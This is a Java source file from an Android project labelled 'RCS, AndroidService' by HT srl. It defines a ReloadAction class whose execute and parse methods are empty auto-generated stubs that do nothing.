/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : ReloadAction.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.action;

import org.json.JSONObject;

import com.android.service.conf.ConfAction;

// TODO: Auto-generated Javadoc
/**
 * The Class ReloadAction.
 */
public class ReloadAction extends SubAction {

	/**
	 * Instantiates a new reload action.
	 * 
	 * @param params
	 *            the conf params
	 */
	public ReloadAction(final ConfAction params) {
		super(params);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
	 */
	@Override
	public boolean execute() {
		// TODO Auto-generated method stub
		return false;
	}

	@Override
	protected boolean parse(ConfAction params) {
		return true;
	}

}
